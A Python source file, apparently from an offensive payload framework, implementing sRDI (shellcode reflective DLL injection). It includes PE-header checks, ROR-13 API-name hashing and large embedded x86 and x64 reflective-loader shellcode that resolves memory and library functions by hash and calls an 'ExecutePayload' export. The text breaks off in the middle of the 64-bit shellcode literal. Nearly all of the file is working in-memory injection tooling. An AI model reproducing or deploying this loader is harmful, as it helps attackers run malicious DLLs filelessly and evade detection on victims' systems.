import base64
import struct

from converters.Transformer import Transformer


class sRDI(Transformer):
    MACHINE_IA64 = 512
    MACHINE_AMD64 = 34404

    def __init__(self):
        super().__init__()
        self.flags = 0 | 0x1 | 0x4 | 30 << 16
        self.function = "ExecutePayload"
        self.args = b"test"
        self.filetype = "dll"

    @staticmethod
    def is64BitDLL(_bytes):
        header_offset = struct.unpack("<L", _bytes[60:64])[0]
        machine = struct.unpack("<H", _bytes[header_offset + 4:header_offset + 4 + 2])[0]
        if machine == sRDI.MACHINE_IA64 or machine == sRDI.MACHINE_AMD64:
            return True
        return False

    @staticmethod
    def ror(val, r_bits, max_bits):
        return ((val & (2 ** max_bits - 1)) >> r_bits % max_bits) | \
            (val << (max_bits - (r_bits % max_bits)) & (2 ** max_bits - 1))

    @staticmethod
    def HashFunctionName(name, module=None):

        function = name.encode() + b'\x00'

        if module:
            module = module.upper().encode('UTF-16LE') + b'\x00\x00'

            function_hash = 0

            for b in function:
                function_hash = sRDI.ror(function_hash, 13, 32)
                function_hash += b

            module_hash = 0

            for b in module:
                module_hash = sRDI.ror(module_hash, 13, 32)
                module_hash += b

            function_hash += module_hash

            if function_hash > 0xFFFFFFFF:
                function_hash -= 0x100000000

        else:
            function_hash = 0

            for b in function:
                function_hash = sRDI.ror(function_hash, 13, 32)
                function_hash += b

        return function_hash

    @staticmethod
    def ConvertToShellcode(dll_bytes, function_hash=0x10, user_data=b'None', flags=0):

        # MARKER:S
        rdi_shellcode32 = b'\x81\xEC\x14\x01\x00\x00\x53\x55\x56\x57\x6A\x6B\x58\x6A\x65\x66\x89\x84\x24\xCC\x00\x00' \
                          b'\x00\x33\xED\x58\x6A\x72\x59\x6A\x6E\x5B\x6A\x6C\x5A\x6A\x33\x66\x89\x84\x24\xCE\x00\x00' \
                          b'\x00\x66\x89\x84\x24\xD4\x00\x00\x00\x58\x6A\x32\x66\x89\x84\x24\xD8\x00\x00\x00\x58\x6A' \
                          b'\x2E\x66\x89\x84\x24\xDA\x00\x00\x00\x58\x6A\x64\x66\x89\x84\x24\xDC\x00\x00\x00\x58\x89' \
                          b'\xAC\x24\xB0\x00\x00\x00\x89\x6C\x24\x34\x89\xAC\x24\xB8\x00\x00\x00\x89\xAC\x24\xC4\x00' \
                          b'\x00\x00\x89\xAC\x24\xB4\x00\x00\x00\x89\xAC\x24\xAC\x00\x00\x00\x89\xAC\x24\xE0\x00\x00' \
                          b'\x00\x66\x89\x8C\x24\xCC\x00\x00\x00\x66\x89\x9C\x24\xCE\x00\x00\x00\x66\x89\x94\x24\xD2' \
                          b'\x00\x00\x00\x66\x89\x84\x24\xDA\x00\x00\x00\x66\x89\x94\x24\xDC\x00\x00\x00\x66\x89\x94' \
                          b'\x24\xDE\x00\x00\x00\xC6\x44\x24\x3C\x53\x88\x54\x24\x3D\x66\xC7\x44\x24\x3E\x65\x65\xC6' \
                          b'\x44\x24\x40\x70\x66\xC7\x44\x24\x50\x4C\x6F\xC6\x44\x24\x52\x61\x88\x44\x24\x53\x66\xC7' \
                          b'\x44\x24\x54\x4C\x69\xC6\x44\x24\x56\x62\x88\x4C\x24\x57\xC6\x44\x24\x58\x61\x88\x4C\x24' \
                          b'\x59\x66\xC7\x44\x24\x5A\x79\x41\x66\xC7\x44\x24\x44\x56\x69\x88\x4C\x24\x46\x66\xC7\x44' \
                          b'\x24\x47\x74\x75\xC6\x44\x24\x49\x61\x88\x54\x24\x4A\xC6\x44\x24\x4B\x41\x88\x54\x24\x4C' \
                          b'\x88\x54\x24\x4D\x66\xC7\x44\x24\x4E\x6F\x63\x66\xC7\x44\x24\x5C\x56\x69\x88\x4C\x24\x5E' \
                          b'\x66\xC7\x44\x24\x5F\x74\x75\xC6\x44\x24\x61\x61\x88\x54\x24\x62\xC6\x44\x24\x63\x50\x88' \
                          b'\x4C\x24\x64\xC7\x44\x24\x65\x6F\x74\x65\x63\xC6\x44\x24\x69\x74\xC6\x84\x24\x94\x00\x00' \
                          b'\x00\x46\x88\x94\x24\x95\x00\x00\x00\xC7\x84\x24\x96\x00\x00\x00\x75\x73\x68\x49\x88\x9C' \
                          b'\x24\x9A\x00\x00\x00\x66\xC7\x84\x24\x9B\x00\x00\x00\x73\x74\x88\x8C\x24\x9D\x00\x00\x00' \
                          b'\xC7\x84\x24\x9E\x00\x00\x00\x75\x63\x74\x69\xC6\x84\x24\xA2\x00\x00\x00\x6F\x6A\x65\x59' \
                          b'\x88\x8C\x24\xA8\x00\x00\x00\x88\x4C\x24\x6D\x88\x4C\x24\x74\x88\x4C\x24\x79\x88\x8C\x24' \
                          b'\x92\x00\x00\x00\xB9\x13\x9C\xBF\xBD\x88\x9C\x24\xA3\x00\x00\x00\xC7\x84\x24\xA4\x00\x00' \
                          b'\x00\x43\x61\x63\x68\xC6\x44\x24\x6C\x47\xC7\x44\x24\x6E\x74\x4E\x61\x74\x66\xC7\x44\x24' \
                          b'\x72\x69\x76\xC7\x44\x24\x75\x53\x79\x73\x74\x66\xC7\x44\x24\x7A\x6D\x49\x88\x5C\x24\x7C' \
                          b'\x66\xC7\x44\x24\x7D\x66\x6F\x66\xC7\x84\x24\x80\x00\x00\x00\x52\x74\x88\x94\x24\x82\x00' \
                          b'\x00\x00\xC6\x84\x24\x83\x00\x00\x00\x41\x88\x84\x24\x84\x00\x00\x00\x88\x84\x24\x85\x00' \
                          b'\x00\x00\x66\xC7\x84\x24\x86\x00\x00\x00\x46\x75\x88\x9C\x24\x88\x00\x00\x00\xC7\x84\x24' \
                          b'\x89\x00\x00\x00\x63\x74\x69\x6F\x88\x9C\x24\x8D\x00\x00\x00\x66\xC7\x84\x24\x8E\x00\x00' \
                          b'\x00\x54\x61\xC6\x84\x24\x90\x00\x00\x00\x62\x88\x94\x24\x91\x00\x00\x00\xE8\x77\x08\x00' \
                          b'\x00\xB9\xB5\x41\xD9\x5E\x8B\xF0\xE8\x6B\x08\x00\x00\x8B\xD8\x8D\x84\x24\xC8\x00\x00\x00' \
                          b'\x6A\x18\x89\x84\x24\xEC\x00\x00\x00\x58\x66\x89\x84\x24\xE6\x00\x00\x00\x66\x89\x84\x24' \
                          b'\xE4\x00\x00\x00\x8D\x44\x24\x1C\x50\x8D\x84\x24\xE8\x00\x00\x00\x89\x5C\x24\x34\x50\x55' \
                          b'\x55\xFF\xD6\x6A\x0C\x5F\x8D\x44\x24\x44\x66\x89\x7C\x24\x14\x89\x44\x24\x18\x8D\x44\x24' \
                          b'\x34\x50\x55\x8D\x44\x24\x1C\x66\x89\x7C\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x0E\x58' \
                          b'\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x44\x24\x5C\x89\x44\x24\x18\x8D\x84\x24\xB4' \
                          b'\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x15\x58\x66\x89\x44' \
                          b'\x24\x14\x66\x89\x44\x24\x16\x8D\x84\x24\x94\x00\x00\x00\x89\x44\x24\x18\x8D\x84\x24\xB8' \
                          b'\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x13\x5E\x8D\x44\x24' \
                          b'\x6C\x66\x89\x74\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xC4\x00\x00\x00\x50\x55\x8D\x44\x24' \
                          b'\x1C\x66\x89\x74\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x05\x58\x66\x89\x44\x24\x14\x66' \
                          b'\x89\x44\x24\x16\x8D\x44\x24\x3C\x89\x44\x24\x18\x8D\x84\x24\xAC\x00\x00\x00\x50\x55\x8D' \
                          b'\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x8D\x84\x24\x80\x00\x00\x00\x66\x89\x74\x24\x14' \
                          b'\x89\x44\x24\x18\x8D\x84\x24\xE0\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x74\x24\x1E' \
                          b'\x50\xFF\x74\x24\x28\xFF\xD3\x8D\x44\x24\x50\x66\x89\x7C\x24\x14\x89\x44\x24\x18\x8D\x84' \
                          b'\x24\xB0\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x7C\x24\x1E\x50\xFF\x74\x24\x28\xFF' \
                          b'\xD3\x39\x6C\x24\x34\x0F\x84\x00\x07\x00\x00\x39\xAC\x24\xB4\x00\x00\x00\x0F\x84\xF3\x06' \
                          b'\x00\x00\x39\xAC\x24\xAC\x00\x00\x00\x0F\x84\xE6\x06\x00\x00\x39\xAC\x24\xB8\x00\x00\x00' \
                          b'\x0F\x84\xD9\x06\x00\x00\x8B\xAC\x24\xC4\x00\x00\x00\x85\xED\x0F\x84\xCA\x06\x00\x00\x8B' \
                          b'\xBC\x24\x28\x01\x00\x00\x8B\x77\x3C\x03\xF7\x81\x3E\x50\x45\x00\x00\x0F\x85\xB2\x06\x00' \
                          b'\x00\xB8\x4C\x01\x00\x00\x66\x39\x46\x04\x0F\x85\xA3\x06\x00\x00\xF6\x46\x38\x01\x0F\x85' \
                          b'\x99\x06\x00\x00\x0F\xB7\x4E\x14\x33\xDB\x0F\xB7\x56\x06\x83\xC1\x24\x85\xD2\x74\x1E\x03' \
                          b'\xCE\x83\x79\x04\x00\x8B\x46\x38\x0F\x45\x41\x04\x03\x01\x8D\x49\x28\x3B\xC3\x0F\x46\xC3' \
                          b'\x8B\xD8\x83\xEA\x01\x75\xE4\x8D\x84\x24\x00\x01\x00\x00\x50\xFF\xD5\x8B\x8C\x24\x04\x01' \
                          b'\x00\x00\x8D\x51\xFF\x8D\x69\xFF\xF7\xD2\x03\x6E\x50\x8D\x41\xFF\x03\xC3\x23\xEA\x23\xC2' \
                          b'\x3B\xE8\x0F\x85\x3D\x06\x00\x00\x6A\x04\x68\x00\x30\x00\x00\x55\xFF\x76\x34\xFF\x54\x24' \
                          b'\x44\x8B\xD8\x89\x5C\x24\x2C\x85\xDB\x75\x13\x6A\x04\x68\x00\x30\x00\x00\x55\x50\xFF\x54' \
                          b'\x24\x44\x8B\xD8\x89\x44\x24\x2C\xF6\x84\x24\x38\x01\x00\x00\x01\x74\x23\x8B\x47\x3C\x89' \
                          b'\x43\x3C\x8B\x4F\x3C\x3B\x4E\x54\x73\x2E\x8B\xEF\x8D\x14\x0B\x2B\xEB\x8A\x04\x2A\x41\x88' \
                          b'\x02\x42\x3B\x4E\x54\x72\xF4\xEB\x19\x33\xED\x39\x6E\x54\x76\x12\x8B\xD7\x8B\xCB\x2B\xD3' \
                          b'\x8A\x04\x11\x45\x88\x01\x41\x3B\x6E\x54\x72\xF4\x8B\x6B\x3C\x33\xC9\x03\xEB\x89\x4C\x24' \
                          b'\x10\x33\xC0\x89\x6C\x24\x28\x0F\xB7\x55\x14\x83\xC2\x28\x66\x3B\x45\x06\x73\x31\x03\xD5' \
                          b'\x33\xF6\x39\x32\x76\x19\x8B\x42\x04\x8B\x4A\xFC\x03\xC6\x03\xCB\x8A\x04\x38\x88\x04\x31' \
                          b'\x46\x3B\x32\x72\xEB\x8B\x4C\x24\x10\x0F\xB7\x45\x06\x41\x83\xC2\x28\x89\x4C\x24\x10\x3B' \
                          b'\xC8\x72\xD1\x8B\xC3\xC7\x84\x24\xBC\x00\x00\x00\x01\x00\x00\x00\x2B\x45\x34\x89\x44\x24' \
                          b'\x24\x0F\x84\xC4\x00\x00\x00\x83\xBD\xA4\x00\x00\x00\x00\x0F\x84\xB7\x00\x00\x00\x8B\xB5' \
                          b'\xA0\x00\x00\x00\x03\xF3\x83\x3E\x00\x0F\x84\xA6\x00\x00\x00\x6A\x02\x8B\xF8\x5D\x8D\x56' \
                          b'\x08\xEB\x75\x0F\xB7\x02\x89\x44\x24\x10\x0F\xB7\xC8\x66\xC1\xE8\x0C\x66\x83\xF8\x0A\x75' \
                          b'\x28\x8B\x16\x8B\x4C\x24\x10\x81\xE1\xFF\x0F\x00\x00\x89\x4C\x24\x10\x8D\x04\x1A\x8B\x0C' \
                          b'\x08\x8D\x04\x1A\x8B\x54\x24\x10\x03\xCF\x89\x0C\x10\x8B\x54\x24\x24\xEB\x37\x66\x83\xF8' \
                          b'\x03\x75\x0D\x81\xE1\xFF\x0F\x00\x00\x03\x0E\x01\x3C\x19\xEB\x24\x66\x3B\x84\x24\xBC\x00' \
                          b'\x00\x00\x75\x07\x8B\xC7\xC1\xE8\x10\xEB\x08\x66\x3B\xC5\x75\x0E\x0F\xB7\xC7\x81\xE1\xFF' \
                          b'\x0F\x00\x00\x03\x0E\x01\x04\x19\x03\xD5\x8B\x46\x04\x03\xC6\x89\x54\x24\x24\x3B\xD0\x0F' \
                          b'\x85\x7A\xFF\xFF\xFF\x83\x3A\x00\x8B\xF2\x0F\x85\x6A\xFF\xFF\xFF\x8B\x6C\x24\x28\x8B\xBC' \
                          b'\x24\x28\x01\x00\x00\x83\xBD\x84\x00\x00\x00\x00\x0F\x84\xD7\x01\x00\x00\x8B\xB5\x80\x00' \
                          b'\x00\x00\x33\xC0\x89\x44\x24\x10\x8D\x0C\x1E\x89\x4C\x24\x24\x83\xC1\x0C\x39\x01\x74\x0D' \
                          b'\x8D\x49\x14\x40\x83\x39\x00\x75\xF7\x89\x44\x24\x10\x8B\x8C\x24\x38\x01\x00\x00\x8B\xD1' \
                          b'\x83\xE2\x04\x89\x54\x24\x38\x8B\xD6\x0F\x84\xC3\x00\x00\x00\x83\xF8\x01\x0F\x86\xBA\x00' \
                          b'\x00\x00\x83\xA4\x24\xBC\x00\x00\x00\x00\xC1\xE9\x10\x89\x8C\x24\x38\x01\x00\x00\x8D\x48' \
                          b'\xFF\x89\x8C\x24\xC0\x00\x00\x00\x85\xC9\x0F\x84\xA1\x00\x00\x00\x8B\x74\x24\x24\x8B\xDE' \
                          b'\x8B\xAC\x24\xBC\x00\x00\x00\x8B\xC8\x69\xFF\xFD\x43\x03\x00\x2B\xCD\x33\xD2\xB8\xFF\x7F' \
                          b'\x00\x00\xF7\xF1\x81\xC7\xC3\x9E\x26\x00\x33\xD2\x89\xBC\x24\x28\x01\x00\x00\x6A\x05\x8D' \
                          b'\x48\x01\x8B\xC7\xC1\xE8\x10\x8D\xBC\x24\xF0\x00\x00\x00\x25\xFF\x7F\x00\x00\xF7\xF1\x59' \
                          b'\x03\xC5\x6B\xC0\x14\x6A\x05\x03\xC6\x45\x8B\xF0\xF3\xA5\x59\x8B\xF3\x8B\xF8\x8B\x44\x24' \
                          b'\x10\xF3\xA5\x6A\x05\x8B\xFB\x8D\xB4\x24\xF0\x00\x00\x00\x59\xF3\xA5\x8B\xBC\x24\x28\x01' \
                          b'\x00\x00\x83\xC3\x14\x8B\x74\x24\x24\x3B\xAC\x24\xC0\x00\x00\x00\x72\x87\x8B\x6C\x24\x28' \
                          b'\x8B\x5C\x24\x2C\x8B\x95\x80\x00\x00\x00\xEB\x0B\x8B\x44\x24\x38\x89\x84\x24\x38\x01\x00' \
                          b'\x00\x8D\x3C\x1A\x8B\x47\x0C\x89\x7C\x24\x2C\x85\xC0\x0F\x84\xB8\x00\x00\x00\x03\xC3\x50' \
                          b'\xFF\x94\x24\xB4\x00\x00\x00\x8B\xD0\x89\x54\x24\x1C\x8B\x37\x8B\x6F\x10\x03\xF3\x03\xEB' \
                          b'\x8B\x0E\x85\xC9\x74\x60\x8B\x7C\x24\x30\x85\xC9\x79\x09\x0F\xB7\x06\x55\x50\x6A\x00\xEB' \
                          b'\x36\x83\xC1\x02\x33\xC0\x03\xCB\x89\x8C\x24\xC0\x00\x00\x00\x38\x01\x74\x0E\x40\x41\x80' \
                          b'\x39\x00\x75\xF9\x8B\x8C\x24\xC0\x00\x00\x00\x55\x66\x89\x44\x24\x18\x66\x89\x44\x24\x1A' \
                          b'\x8D\x44\x24\x18\x6A\x00\x89\x4C\x24\x20\x50\x52\xFF\xD7\x83\xC6\x04\x83\xC5\x04\x8B\x0E' \
                          b'\x85\xC9\x74\x06\x8B\x54\x24\x1C\xEB\xA8\x8B\x7C\x24\x2C\x83\x7C\x24\x38\x00\x74\x1C\x33' \
                          b'\xC0\x40\x39\x44\x24\x10\x76\x13\x69\x84\x24\x38\x01\x00\x00\xE8\x03\x00\x00\x50\xFF\x94' \
                          b'\x24\xB0\x00\x00\x00\x8B\x47\x20\x83\xC7\x14\x89\x7C\x24\x2C\x85\xC0\x0F\x85\x4C\xFF\xFF' \
                          b'\xFF\x8B\x6C\x24\x28\x83\xBD\xE4\x00\x00\x00\x00\x0F\x84\xAD\x00\x00\x00\x8B\x85\xE0\x00' \
                          b'\x00\x00\x83\xC0\x04\x03\xC3\x89\x44\x24\x10\x8B\x00\x85\xC0\x0F\x84\x94\x00\x00\x00\x8B' \
                          b'\x6C\x24\x10\x03\xC3\x50\xFF\x94\x24\xB4\x00\x00\x00\x8B\xC8\x89\x4C\x24\x1C\x8B\x75\x08' \
                          b'\x8B\x7D\x0C\x03\xF3\x03\xFB\x83\x3E\x00\x74\x5B\x8B\x6C\x24\x30\x8B\x17\x85\xD2\x79\x09' \
                          b'\x56\x0F\xB7\xC2\x50\x6A\x00\xEB\x30\x83\xC2\x02\x33\xC0\x03\xD3\x89\x54\x24\x38\x38\x02' \
                          b'\x74\x0B\x40\x42\x80\x3A\x00\x75\xF9\x8B\x54\x24\x38\x56\x66\x89\x44\x24\x18\x66\x89\x44' \
                          b'\x24\x1A\x8D\x44\x24\x18\x6A\x00\x89\x54\x24\x20\x50\x51\xFF\xD5\x83\xC6\x04\x83\xC7\x04' \
                          b'\x83\x3E\x00\x74\x06\x8B\x4C\x24\x1C\xEB\xAD\x8B\x6C\x24\x10\x83\xC5\x20\x89\x6C\x24\x10' \
                          b'\x8B\x45\x00\x85\xC0\x0F\x85\x74\xFF\xFF\xFF\x8B\x6C\x24\x28\x0F\xB7\x75\x14\x33\xC0\x83' \
                          b'\xC6\x28\x33\xFF\x66\x3B\x45\x06\x0F\x83\xE5\x00\x00\x00\x03\xF5\xBA\x00\x00\x00\x40\x83' \
                          b'\x3E\x00\x0F\x84\xC5\x00\x00\x00\x8B\x4E\x14\x8B\xC1\x25\x00\x00\x00\x20\x75\x0B\x85\xCA' \
                          b'\x75\x07\x85\xC9\x78\x03\x40\xEB\x62\x85\xC0\x75\x30\x85\xCA\x75\x08\x85\xC9\x79\x04\x6A' \
                          b'\x08\xEB\x51\x85\xC0\x75\x20\x85\xCA\x74\x08\x85\xC9\x78\x04\x6A\x02\xEB\x41\x85\xC0\x75' \
                          b'\x10\x85\xCA\x74\x08\x85\xC9\x79\x04\x6A\x04\xEB\x31\x85\xC0\x74\x4A\x85\xCA\x75\x08\x85' \
                          b'\xC9\x78\x04\x6A\x10\xEB\x21\x85\xC0\x74\x3A\x85\xCA\x75\x0B\x85\xC9\x79\x07\xB8\x80\x00' \
                          b'\x00\x00\xEB\x0F\x85\xC0\x74\x27\x85\xCA\x74\x0D\x85\xC9\x78\x09\x6A\x20\x58\x89\x44\x24' \
                          b'\x20\xEB\x1A\x85\xC0\x74\x12\x85\xCA\x74\x0E\x8B\x44\x24\x20\x85\xC9\x6A\x40\x5A\x0F\x48' \
                          b'\xC2\xEB\xE4\x8B\x44\x24\x20\xF7\x46\x14\x00\x00\x00\x04\x74\x09\x0D\x00\x02\x00\x00\x89' \
                          b'\x44\x24\x20\x8D\x4C\x24\x20\x51\x50\x8B\x46\xFC\xFF\x36\x03\xC3\x50\xFF\x94\x24\xC4\x00' \
                          b'\x00\x00\xBA\x00\x00\x00\x40\x0F\xB7\x45\x06\x47\x83\xC6\x28\x3B\xF8\x0F\x82\x22\xFF\xFF' \
                          b'\xFF\x6A\x00\x6A\x00\x6A\xFF\xFF\x94\x24\xC4\x00\x00\x00\x83\xBD\xC4\x00\x00\x00\x00\x74' \
                          b'\x26\x8B\x85\xC0\x00\x00\x00\x8B\x74\x18\x0C\x8B\x06\x85\xC0\x74\x16\x33\xED\x45\x6A\x00' \
                          b'\x55\x53\xFF\xD0\x8D\x76\x04\x8B\x06\x85\xC0\x75\xF1\x8B\x6C\x24\x28\x33\xC0\x40\x50\x50' \
                          b'\x8B\x45\x28\x53\x03\xC3\xFF\xD0\x83\xBC\x24\x2C\x01\x00\x00\x00\x0F\x84\xAB\x00\x00\x00' \
                          b'\x83\x7D\x7C\x00\x0F\x84\xA1\x00\x00\x00\x8B\x55\x78\x03\xD3\x8B\x6A\x18\x85\xED\x0F\x84' \
                          b'\x91\x00\x00\x00\x83\x7A\x14\x00\x0F\x84\x87\x00\x00\x00\x8B\x7A\x20\x8B\x4A\x24\x03\xFB' \
                          b'\x83\x64\x24\x30\x00\x03\xCB\x85\xED\x74\x74\x8B\x37\xC7\x44\x24\x10\x00\x00\x00\x00\x03' \
                          b'\xF3\x74\x66\x8A\x06\x84\xC0\x74\x1A\x8B\x6C\x24\x10\x0F\xBE\xC0\x03\xE8\xC1\xCD\x0D\x46' \
                          b'\x8A\x06\x84\xC0\x75\xF1\x89\x6C\x24\x10\x8B\x6A\x18\x8B\x84\x24\x2C\x01\x00\x00\x3B\x44' \
                          b'\x24\x10\x75\x04\x85\xC9\x75\x15\x8B\x44\x24\x30\x83\xC7\x04\x40\x83\xC1\x02\x89\x44\x24' \
                          b'\x30\x3B\xC5\x72\xAE\xEB\x20\x0F\xB7\x09\x8B\x42\x1C\xFF\xB4\x24\x34\x01\x00\x00\xFF\xB4' \
                          b'\x24\x34\x01\x00\x00\x8D\x04\x88\x8B\x04\x18\x03\xC3\xFF\xD0\x59\x59\x8B\xC3\xEB\x02\x33' \
                          b'\xC0\x5F\x5E\x5D\x5B\x81\xC4\x14\x01\x00\x00\xC3\x83\xEC\x14\x64\xA1\x30\x00\x00\x00\x53' \
                          b'\x55\x56\x8B\x40\x0C\x57\x89\x4C\x24\x1C\x8B\x78\x0C\xE9\xA5\x00\x00\x00\x8B\x47\x30\x33' \
                          b'\xF6\x8B\x5F\x2C\x8B\x3F\x89\x44\x24\x10\x8B\x42\x3C\x89\x7C\x24\x14\x8B\x6C\x10\x78\x89' \
                          b'\x6C\x24\x18\x85\xED\x0F\x84\x80\x00\x00\x00\xC1\xEB\x10\x33\xC9\x85\xDB\x74\x2F\x8B\x7C' \
                          b'\x24\x10\x0F\xBE\x2C\x0F\xC1\xCE\x0D\x80\x3C\x0F\x61\x89\x6C\x24\x10\x7C\x09\x8B\xC5\x83' \
                          b'\xC0\xE0\x03\xF0\xEB\x04\x03\x74\x24\x10\x41\x3B\xCB\x72\xDD\x8B\x7C\x24\x14\x8B\x6C\x24' \
                          b'\x18\x8B\x44\x2A\x20\x33\xDB\x8B\x4C\x2A\x18\x03\xC2\x89\x4C\x24\x10\x85\xC9\x74\x34\x8B' \
                          b'\x38\x33\xED\x03\xFA\x83\xC0\x04\x89\x44\x24\x20\x8A\x0F\xC1\xCD\x0D\x0F\xBE\xC1\x03\xE8' \
                          b'\x47\x84\xC9\x75\xF1\x8B\x7C\x24\x14\x8D\x04\x2E\x3B\x44\x24\x1C\x74\x20\x8B\x44\x24\x20' \
                          b'\x43\x3B\x5C\x24\x10\x72\xCC\x8B\x57\x18\x85\xD2\x0F\x85\x50\xFF\xFF\xFF\x33\xC0\x5F\x5E' \
                          b'\x5D\x5B\x83\xC4\x14\xC3\x8B\x74\x24\x18\x8B\x44\x16\x24\x8D\x04\x58\x0F\xB7\x0C\x10\x8B' \
                          b'\x44\x16\x1C\x8D\x04\x88\x8B\x04\x10\x03\xC2\xEB\xDB '
        rdi_shellcode64 = b'\x48\x8B\xC4\x48\x89\x58\x08\x44\x89\x48\x20\x4C\x89\x40\x18\x89\x50\x10\x55\x56\x57\x41' \
                          b'\x54\x41\x55\x41\x56\x41\x57\x48\x8D\x6C\x24\x90\x48\x81\xEC\x70\x01\x00\x00\x45\x33\xFF' \
                          b'\xC7\x45\xD8\x6B\x00\x65\x00\x48\x8B\xF1\x4C\x89\x7D\xF8\xB9\x13\x9C\xBF\xBD\x4C\x89\x7D' \
                          b'\xC8\x4C\x89\x7D\x08\x45\x8D\x4F\x65\x4C\x89\x7D\x10\x44\x88\x4D\xBC\x44\x88\x4D\xA2\x4C' \
                          b'\x89\x7D\x00\x4C\x89\x7D\xF0\x4C\x89\x7D\x18\x44\x89\x7D\x24\x44\x89\x7C\x24\x2C\xC7\x45' \
                          b'\xDC\x72\x00\x6E\x00\xC7\x45\xE0\x65\x00\x6C\x00\xC7\x45\xE4\x33\x00\x32\x00\xC7\x45\xE8' \
                          b'\x2E\x00\x64\x00\xC7\x45\xEC\x6C\x00\x6C\x00\xC7\x44\x24\x40\x53\x6C\x65\x65\xC6\x44\x24' \
                          b'\x44\x70\xC7\x44\x24\x58\x4C\x6F\x61\x64\xC7\x44\x24\x5C\x4C\x69\x62\x72\xC7\x44\x24\x60' \
                          b'\x61\x72\x79\x41\xC7\x44\x24\x48\x56\x69\x72\x74\xC7\x44\x24\x4C\x75\x61\x6C\x41\xC7\x44' \
                          b'\x24\x50\x6C\x6C\x6F\x63\xC7\x44\x24\x68\x56\x69\x72\x74\xC7\x44\x24\x6C\x75\x61\x6C\x50' \
                          b'\xC7\x44\x24\x70\x72\x6F\x74\x65\x66\xC7\x44\x24\x74\x63\x74\xC7\x45\xA8\x46\x6C\x75\x73' \
                          b'\xC7\x45\xAC\x68\x49\x6E\x73\xC7\x45\xB0\x74\x72\x75\x63\xC7\x45\xB4\x74\x69\x6F\x6E\xC7' \
                          b'\x45\xB8\x43\x61\x63\x68\xC7\x44\x24\x78\x47\x65\x74\x4E\xC7\x44\x24\x7C\x61\x74\x69\x76' \
                          b'\xC7\x45\x80\x65\x53\x79\x73\xC7\x45\x84\x74\x65\x6D\x49\x66\xC7\x45\x88\x6E\x66\xC6\x45' \
                          b'\x8A\x6F\xC7\x45\x90\x52\x74\x6C\x41\xC7\x45\x94\x64\x64\x46\x75\xC7\x45\x98\x6E\x63\x74' \
                          b'\x69\xC7\x45\x9C\x6F\x6E\x54\x61\x66\xC7\x45\xA0\x62\x6C\xE8\x7F\x08\x00\x00\xB9\xB5\x41' \
                          b'\xD9\x5E\x48\x8B\xD8\xE8\x72\x08\x00\x00\x4C\x8B\xE8\x48\x89\x45\xD0\x48\x8D\x45\xD8\xC7' \
                          b'\x45\x20\x18\x00\x18\x00\x4C\x8D\x4C\x24\x38\x48\x89\x45\x28\x4C\x8D\x45\x20\x33\xD2\x33' \
                          b'\xC9\xFF\xD3\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x48\x45\x33\xC0\x48\x89\x44\x24\x30\x4C' \
                          b'\x8D\x4D\xC8\xC7\x44\x24\x28\x0C\x00\x0C\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C' \
                          b'\x24\x38\x48\x8D\x44\x24\x68\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x00\xC7\x44\x24' \
                          b'\x28\x0E\x00\x0E\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8D\x45\xA8\xC7\x44\x24\x28\x15' \
                          b'\x00\x15\x00\x48\x8B\x4C\x24\x38\x4C\x8D\x4D\x08\x45\x33\xC0\x48\x89\x44\x24\x30\x48\x8D' \
                          b'\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x78\x45\x33\xC0\x48\x89\x44' \
                          b'\x24\x30\x4C\x8D\x4D\x10\xC7\x44\x24\x28\x13\x00\x13\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5' \
                          b'\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x40\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xF0' \
                          b'\xC7\x44\x24\x28\x05\x00\x05\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48' \
                          b'\x8D\x45\x90\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x18\xC7\x44\x24\x28\x13\x00\x13' \
                          b'\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x58\x45\x33\xC0' \
                          b'\x48\x89\x44\x24\x30\x4C\x8D\x4D\xF8\xC7\x44\x24\x28\x0C\x00\x0C\x00\x48\x8D\x54\x24\x28' \
                          b'\x41\xFF\xD5\x4C\x39\x7D\xC8\x0F\x84\x1D\x07\x00\x00\x4C\x39\x7D\x00\x0F\x84\x13\x07\x00' \
                          b'\x00\x4C\x39\x7D\xF0\x0F\x84\x09\x07\x00\x00\x4C\x39\x7D\x08\x0F\x84\xFF\x06\x00\x00\x48' \
                          b'\x8B\x55\x10\x48\x85\xD2\x0F\x84\xF2\x06\x00\x00\x48\x63\x7E\x3C\x48\x03\xFE\x81\x3F\x50' \
                          b'\x45\x00\x00\x0F\x85\xDF\x06\x00\x00\xB8\x64\x86\x00\x00\x66\x39\x47\x04\x0F\x85\xD0\x06' \
                          b'\x00\x00\x45\x8D\x4F\x01\x44\x84\x4F\x38\x0F\x85\xC2\x06\x00\x00\x0F\xB7\x4F\x14\x41\x8B' \
                          b'\xDF\x48\x83\xC1\x24\x66\x44\x3B\x7F\x06\x73\x25\x44\x0F\xB7\x47\x06\x48\x03\xCF\x44\x39' \
                          b'\x79\x04\x8B\x47\x38\x0F\x45\x41\x04\x03\x01\x48\x8D\x49\x28\x3B\xC3\x0F\x46\xC3\x8B\xD8' \
                          b'\x4D\x2B\xC1\x75\xE3\x48\x8D\x4D\x38\xFF\xD2\x8B\x55\x3C\x44\x8B\xC2\x44\x8D\x72\xFF\xF7' \
